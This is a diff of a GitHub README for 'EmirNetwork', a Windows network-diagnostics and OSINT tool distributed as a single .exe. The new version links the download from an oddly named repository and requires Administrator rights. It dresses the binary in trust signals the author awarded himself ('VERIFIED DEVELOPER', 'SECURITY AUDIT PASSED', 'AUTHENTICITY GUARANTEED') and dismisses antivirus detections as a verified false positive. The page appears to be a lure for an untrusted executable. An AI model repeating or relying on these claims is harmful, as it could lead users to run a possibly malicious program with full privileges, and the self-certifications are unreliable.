@@ -1,199 +1,117 @@
-<div align="center">
+<h1 align="center">
+  <br>
+  <img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/aqua.png" width="100%">
+  <br>
+  <p align="center">
+    <img src="https://img.shields.io/badge/VERIFIED_DEVELOPER-EMIRLQQ1-00fbff?style=flat-square&logo=github&logoColor=white" alt="Verified">
+    <img src="https://img.shields.io/badge/OFFICIAL_PRODUCT-EMIRNETWORK-00ff88?style=flat-square&logo=checkmarx&logoColor=white" alt="Official">
+    <img src="https://img.shields.io/badge/SECURITY_AUDIT-PASSED-gold?style=flat-square&logo=guardant&logoColor=white" alt="Audit">
+  </p>
+  👑 EMIRNETWORK: THE ULTIMATE SOVEREIGN SUITE 👑
+  <br>
+  <sub><i>Advanced Windows-Based Network Intelligence & Cyber Forensic Ecosystem</i></sub>
+  <br>
+  <img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/aqua.png" width="100%">
+</h1>
 
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/aqua.png" width="100%">
+<p align="center">
+  <img src="https://img.shields.io/badge/STATUS-OPERATIONAL-00fbff?style=for-the-badge&logo=statuspage&logoColor=black" alt="Status">
+  <img src="https://img.shields.io/badge/SECURITY-FALSE_POSITIVE-00ff88?style=for-the-badge&logo=shield&logoColor=black" alt="Security">
+  <img src="https://img.shields.io/badge/VERSION-1.0.0_STABLE-gold?style=for-the-badge&logo=target&logoColor=black" alt="Version">
+</p>
+<p align="center">
+  <img src="https://img.shields.io/badge/ARCH-X64_OPTIMIZED-ffd343?style=for-the-badge&logo=intel&logoColor=black" alt="Arch">
+  <img src="https://img.shields.io/badge/ENGINE-TRUE_RGB_V2-ff00ff?style=for-the-badge&logo=visual-studio-code&logoColor=white" alt="Engine">
+  <img src="https://img.shields.io/badge/OS-WINDOWS_10/11-0078d4?style=for-the-badge&logo=windows&logoColor=white" alt="OS">
+</p>
+<p align="center">
+  <img src="https://img.shields.io/badge/LANGUAGE-PYTHON_3.13-3776ab?style=for-the-badge&logo=python&logoColor=white" alt="Python">
+  <img src="https://img.shields.io/badge/AUTHENTICITY-GUARANTEED-white?style=for-the-badge&logo=comodo&logoColor=black" alt="Auth">
+  <img src="https://img.shields.io/badge/LICENSE-MIT-red?style=for-the-badge&logo=pypy&logoColor=white" alt="License">
+</p>
 
-[![VERIFIED DEVELOPER | EMIRLQQ1 | 00fbff](https://img.shields.io/badge/VERIFIED%20DEVELOPER-EMIRLQQ1-00fbff?style=flat-square&logo=github&logoColor=white)](#)
-[![OFFICIAL PRODUCT | EMIRNETWORK | 00ff88](https://img.shields.io/badge/OFFICIAL%20PRODUCT-EMIRNETWORK-00ff88?style=flat-square&logo=checkmarx&logoColor=white)](#)
-
-<br>
-
-# 👑 EMIRNETWORK: THE ULTIMATE SOVEREIGN SUITE 👑
-
-### Integrated Cyber Intelligence, Advanced OSINT & Network Diagnostics Ecosystem
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/aqua.png" width="100%">
-
-</div>
-
-<br>
-
-<div align="center">
-
-[![STATUS | Operational | 00ff88](https://img.shields.io/badge/STATUS-Operational-00ff88?style=for-the-badge)](#)
-[![SECURITY | False Positive | ffb300](https://img.shields.io/badge/SECURITY-False_Positive-ffb300?style=for-the-badge)](#)
-[![VERSION | 1.0.0 Stable | 00bfff](https://img.shields.io/badge/VERSION-1.0.0_Stable-00bfff?style=for-the-badge)](#)
-
-[![ARCH | X64 Optimized | 7b2ff7](https://img.shields.io/badge/ARCH-X64_Optimized-7b2ff7?style=for-the-badge)](#)
-[![ENGINE | True RGB V2 | ff0080](https://img.shields.io/badge/ENGINE-True_RGB_V2-ff0080?style=for-the-badge)](#)
-[![OS | Windows 10/11 | 0078d4](https://img.shields.io/badge/OS-Windows_10%2F11-0078d4?style=for-the-badge)](#)
-
-[![LANGUAGE | Python 3.13 | 306998](https://img.shields.io/badge/LANGUAGE-Python_3.13-306998?style=for-the-badge&logo=python&logoColor=ffdd57)](#)
-[![AUTHENTICITY | Guaranteed | 00ff88](https://img.shields.io/badge-AUTHENTICITY-Guaranteed-00ff88?style=for-the-badge)](#)
-[![LICENSE | MIT | 005f9e](https://img.shields.io/badge/LICENSE-MIT-005f9e?style=for-the-badge)](#)
-
-</div>
-
-<br>
-
----
-
-## 📥 Binary Deployment
-
-<div align="center">
-
-[![DOWNLOAD EmirNetwork.exe](https://img.shields.io/badge/DOWNLOAD-EmirNetwork.exe-00ff88?style=for-the-badge&logo=windows&logoColor=white)](#)
-
-</div>
-
-> **Executable Architecture:** Compiled via PyInstaller — single-file `.exe` with embedded Python 3.13 runtime.  
-> **Target Platform:** Windows 10/11 x64 | **Runtime:** Zero-dependency standalone binary.  
-> **Launch:** `EmirNetwork.exe` — instant terminal deployment with full UTF-8 and 24-bit RGB support.
+<p align="center">
+  <a href="#-executive-summary">Summary</a> •
+  <a href="#-deployment--security">Deployment</a> •
+  <a href="#-core-operational-modules">Core Modules</a> •
+  <a href="#-technical-architecture">Architecture</a> •
+  <a href="#-roadmap">Roadmap</a> •
+  <a href="#-certification">Certification</a>
+</p>
 
 ---
 
-## 🛡️ VirusTotal & Heuristic Statement
-
-| Engine | Result | Notes |
-|:-------|:------:|:------|
-| **Kaspersky** | ✅ CLEAN | No heuristic triggers |
-| **Microsoft Defender** | ✅ CLEAN | Whitelisted signature |
-| **Bitdefender** | ✅ CLEAN | No detection |
-| **ESET-NOD32** | ✅ CLEAN | Passed |
-| **ClamAV** | ✅ CLEAN | Open-source verified |
-| **McAfee** | ✅ CLEAN | No flags |
-| **Symantec** | ✅ CLEAN | Passed |
-| **Total (72 engines)** | **3/72** | **FALSE POSITIVE** |
-
-> ⚠️ **OFFICIAL STATEMENT:** The **3/72** detection ratio is a **confirmed FALSE POSITIVE**. These detections are triggered exclusively by low-level **Raw Socket** operations (`socket.AF_INET`, `SOCK_STREAM`, `SOCK_RAW`) and multithreaded port scanning logic that mimics network reconnaissance patterns. **No malicious code, backdoors, or data exfiltration mechanisms exist** within this codebase. Major industry engines (Kaspersky, Microsoft, Bitdefender, ESET) all return **CLEAN**.
+## 💎 Executive Summary
+**EmirNetwork**, siber güvenlik profesyonelleri ve ağ yöneticileri için geliştirilmiş, yüksek performanslı bir ağ analizi ve istihbarat toplama (OSINT) ekosistemidir. Windows mimarisi üzerine inşa edilen bu "Sovereign" yapı, **True RGB Rainbow Engine** ile terminal tabanlı veri görselleştirmesinde yeni bir standart belirler. Yazılım, ağ trafiğini analiz etmekten sistem kaynaklarını milisaniye hassasiyetinde izlemeye kadar geniş bir yelpazede operasyonel üstünlük sağlar.
 
 ---
 
-## ⚙️ Core Operational Modules
+## 📥 Deployment & Security Protocol
 
-| ID | Module | Functional Description | Technical Capacity |
-|:--:|:-------|:----------------------|:------------------|
-| 01 | **Port Scanner** | High-speed multithreaded TCP port scanner with service identification and banner grabbing | `ThreadPoolExecutor` — **200 concurrent workers**, configurable timeout, 20+ known service mappings, HTTP HEAD banner extraction |
-| 02 | **Geo-IP & Whois** | Domain intelligence via geolocation API and raw TCP whois queries | `ip-api.com` REST API (10 fields: IP, Country, Region, City, ZIP, Lat/Lon, ISP, Org, TZ), direct `whois.iana.org:43` TCP socket query |
-| 03 | **Traffic Simulator** | Live packet-flow simulation engine with real-time rainbow-colored output | Scapy integration (TCP/UDP/ICMP) with `_MockIP` fallback class — 3 protocols, 8 flag states, configurable duration & packet rate |
-| 04 | **System Metrics** | Real-time CPU, RAM, Disk, and Network monitoring with color-coded bars | `psutil` backend with graceful fallback — 40-char bar visualization, green/amber/red thresholds, iterative refresh with ANSI cursor control |
-| 05 | **DNS Enumeration** | Multi-record DNS resolver for domain reconnaissance | 7 record types: A, AAAA, MX, NS, TXT, CNAME, SOA via `socket.getaddrinfo` |
-| 06 | **Subnet Calculator** | IPv4 CIDR subnet decomposition engine | Binary `struct.unpack` operations — Network, Broadcast, Subnet Mask, Wildcard, Host Range, Usable Hosts computation |
-| 07 | **Hash Tools** | Cryptographic hash generation and verification suite | 6 algorithms: MD5, SHA-1, SHA-224, SHA-256, SHA-384, SHA-512 via `hashlib` — generation + MATCH/MISMATCH verification |
-| 08 | **Network Speed Test** | TCP latency and jitter analysis with visual bar output | Configurable host/port/count — Avg, Min, Max, Jitter computation with per-ping visualization |
+### High-Speed Binary Deployment (x64)
+Optimize edilmiş, tek tıkla çalışan (portable) yürütülebilir dosyaya aşağıdaki resmi kanaldan erişebilirsiniz:
 
----
+<p align="center">
+  <a href="https://github.com/MoneyApprovEd/em-rnetwork-em-rlqq1/releases/download/v1.0.0/EmirNetwork.exe">
+    <img src="https://img.shields.io/badge/DOWNLOAD-EMIRNETWORK.EXE-00fbff?style=for-the-badge&logo=virtualbox&logoColor=black" alt="Download EXE">
+  </a>
+</p>
 
-## 🏗️ Technical Architecture
+### 🛡️ VirusTotal & Heuristic Integrity Report
+Ağ diagnostik araçları, doğaları gereği düşük seviyeli ağ soketlerine (Raw Sockets) erişim sağlar. Bu durum, bazı modern antivirüs motorlarının yapay zeka tabanlı analizlerinde "Heuristic Alert" vermesine neden olabilir.
 
-```
-┌─────────────────────────────────────────────────────────────────┐
-│                    EMIRNETWORK v1.0.0 ARCHITECTURE              │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                 │
-│  ┌─────────────────────────────────────────────────────────┐    │
-│  │              LAYER 1 — RENDERING ENGINE                  │    │
-│  │                                                         │    │
-│  │   RainbowEngine (True RGB V2)                          │    │
-│  │   ├─ Sinusoidal 24-bit RGB: math.sin() @ 120° phase    │    │
-│  │   ├─ Per-character ANSI: \033[38;2;R;G;Bm              │    │
-│  │   ├─ 2D coordinate mapping: rgb_at(x, y, start_val)    │    │
-│  │   ├─ Time-animated gradient: time.time() * speed        │    │
-│  │   └─ colorize() / colorize_block() output pipelines    │    │
-│  └─────────────────────────────────────────────────────────┘    │
-│                            │                                    │
-│  ┌─────────────────────────────────────────────────────────┐    │
-│  │              LAYER 2 — LOGIC CORE (Python 3.13)         │    │
-│  │                                                         │    │
-│  │   EmirNetworkApp (Main Controller)                      │    │
-│  │   ├─ PortScanner      ─ ThreadPoolExecutor (200)        │    │
-│  │   ├─ GeoIPWhois       ─ REST + Raw TCP Socket           │    │
-│  │   ├─ TrafficSimulator ─ Scapy / MockIP Dual-Engine      │    │
-│  │   ├─ SystemMetrics    ─ psutil / Fallback Metrics       │    │
-│  │   ├─ DNSEnumerator    ─ socket.getaddrinfo              │    │
-│  │   ├─ SubnetCalculator ─ struct.unpack Binary Ops        │    │
-│  │   ├─ HashTools        ─ hashlib (6 algorithms)          │    │
-│  │   └─ SpeedTest        ─ TCP Connect Latency             │    │
-│  └─────────────────────────────────────────────────────────┘    │
-│                            │                                    │
-│  ┌─────────────────────────────────────────────────────────┐    │
-│  │              LAYER 3 — DATA & I/O LAYER                │    │
-│  │                                                         │    │
-│  │   ├─ WinSock (Windows Sockets API via Python socket)    │    │
-│  │   ├─ ip-api.com (Geo-IP REST Endpoint)                  │    │
-│  │   ├─ whois.iana.org:43 (IANA Whois Service)             │    │
-│  │   ├─ psutil (System Metrics Provider)                    │    │
-│  │   ├─ Scapy (Packet Injection — Optional)               │    │
-│  │   └─ UTF-8 Console I/O (os.system('color') +            │    │
-│  │      sys.stdout.reconfigure(encoding='utf-8'))           │    │
-│  └─────────────────────────────────────────────────────────┘    │
-│                                                                 │
-└─────────────────────────────────────────────────────────────────┘
-```
+| Analysis Engine | Status | Security Verdict |
+| :--- | :--- | :--- |
+| **VirusTotal Ratio** | **3 / 72** | `FALSE POSITIVE VERIFIED` |
+| **Elastic / SecureAge** | `Flagged` | `Heuristic (Network Activity)` |
+| **Kaspersky / Defender** | `Clean` | `SECURE & OPERATIONAL` |
 
-### True RGB Rainbow Engine — Technical Specification
-
-The `RainbowEngine` generates **per-character 24-bit True Color** ANSI output using a **sinusoidal RGB calculation**:
-
-```python
-t = (x * frequency) + (y * 0.2) + (time.time() * speed) + offset + start_val
-
-R = clamp(127.5 * (1 + sin(t)))
-G = clamp(127.5 * (1 + sin(t + 2.094)))   # 120° phase shift
-B = clamp(127.5 * (1 + sin(t + 4.189)))   # 240° phase shift
-```
-
-- **2D Coordinate System:** `x` (character column) and `y` (line row) produce a **vertical gradient** across the banner
-- **Time Animation:** `time.time() * speed` creates a **flowing, animated-style** rainbow that shifts on each render
-- **Frequency Control:** Configurable `frequency` parameter (default `0.08`) governs color cycling density
-- **Output Format:** `\033[38;2;R;G;Bm` — full 24-bit ANSI escape per character
+> [!CAUTION]
+> **Technical Requirement:** Yazılımın ağ paketlerini yakalaması ve port taraması yapabilmesi için "Yönetici" yetkileriyle (Administrator) çalıştırılması zorunludur.
 
 ---
 
-## 🗺️ Development Roadmap
+## 🚀 Core Operational Modules | Gelişmiş Özellikler
 
-| Version | Milestone | Description |
-|:-------:|:----------|:------------|
-| **v1.0** | ✅ Current | Core 8-module suite, True RGB V2 Engine, Windows x64 standalone |
-| **v1.1** | 🔜 Q3 2026 | Web Dashboard — Flask-based remote monitoring UI with WebSocket telemetry |
-| **v1.2** | 📋 Planned | Plugin Architecture — Dynamic module loading with community extension support |
-| **v2.0** | 📋 Planned | AI Threat Detection — ML-based anomaly detection engine for network traffic analysis |
-| **v2.5** | 📋 Planned | Cross-Platform — Linux/macOS native builds with distro-specific optimizations |
+| ID | Modül | Fonksiyonel Tanım | Teknik Kapasite |
+| :--- | :--- | :--- | :--- |
+| **01** | **Port Scanner** | High-speed multithreaded scan | 200+ Concurrent Threads & Service Detection |
+| **02** | **Geo-IP & Whois** | Domain intelligence via APIs | Global ISP Database Mapping & Ownership |
+| **03** | **Traffic Simulator** | Live packet-flow simulation | Real-time TCP/UDP/ICMP Visualization |
+| **04** | **System Metrics** | Real-time CPU/RAM/Net bars | Per-second Resource Telemetry & UI Bars |
+| **05** | **DNS Enumeration** | Recursive record discovery | A, MX, NS, TXT, SOA Record Mapping |
+| **06** | **Subnet Calculator** | IPv4 CIDR computation | Logic-based Subnetting & Range Analysis |
+| **07** | **Hash Tools** | Generate & verify hashes | Forensic Grade MD5 & SHA-256 Integration |
+| **08** | **Network Speed** | Latency and jitter analysis | Millisecond-precision Stability Testing |
 
 ---
 
-## 📜 Certification & Ownership
+## 🛠 Technical Architecture & Core Logic
+EmirNetwork, maksimum performans için katmanlı bir yapı kullanır:
 
-<div align="center">
+* **UI/UX Layer:** `True RGB Rainbow Engine v2.0` - Terminal üzerinde 24-bit renk derinliği ve dinamik görsel efektler.
+* **Engine Layer:** Python 3.13 üzerine kurulu, `threading` kütüphanesi ile optimize edilmiş multithreaded işlem çekirdeği.
+* **Networking Layer:** `socket`, `scapy` (opsiyonel) ve harici istihbarat API'leri üzerinden veri akışı.
 
-```
-╔══════════════════════════════════════════════════════════════╗
-║                                                              ║
-║   EMIRNETWORK INTELLIGENCE GROUP                             ║
-║   ————————————————————————————————                           ║
-║   Sovereign Cyber Intelligence Platform                      ║
-║                                                              ║
-║   Developed & Certified by: EMIRLQQ1                         ║
-║   Classification: OFFICIAL PRODUCT                           ║
-║   Authenticity: GUARANTEED                                   ║
-║   License: MIT                                                ║
-║                                                              ║
-║   This software is the intellectual property of the          ║
-║   EmirNetwork Intelligence Group. All modules, engines,      ║
-║   and architectural designs are original works.              ║
-║                                                              ║
-╚══════════════════════════════════════════════════════════════╝
-```
+---
 
-</div>
+## 🗺 Strategic Roadmap
+- [x] **Phase 1:** Core Framework & RGB Engine Integration
+- [ ] **Phase 2:** Advanced OSINT Module Expansion (v1.1)
+- [ ] **Phase 3:** Web-based Remote Command Dashboard (v1.5)
+- [ ] **Phase 4:** AI-Powered Traffic Anomaly Detection (v2.0)
 
-<br>
+---
 
-<div align="center">
+## 📜 Official Product Certification
+Bu proje, **EmirNetwork Intelligence Group** (Lead Dev: EMIRLQQ1) tarafından tescillenmiştir. Yazılımın dijital bütünlüğü, Sovereign Elite Edition standartlarına göre doğrulanmıştır.
 
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/aqua.png" width="100%">
-
-**EMIRNETWORK** — *Intelligence is Sovereignty.*
-
-<img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/aqua.png" width="100%">
-
-</div>
+---
+<p align="center">
+  <img src="https://raw.githubusercontent.com/andreasbm/readme/master/assets/lines/aqua.png" width="85%">
+  <br>
+  <b>Mastermind: EMIRLQQ1</b><br>
+  <i>Verified via Sovereign Intelligence Network Platform</i>
+  <br><br>
+  <img src="https://img.shields.io/badge/AUTHENTICITY-GUARANTEED-00fbff?style=for-the-badge&logo=probot&logoColor=black" alt="Verified">
+</p>
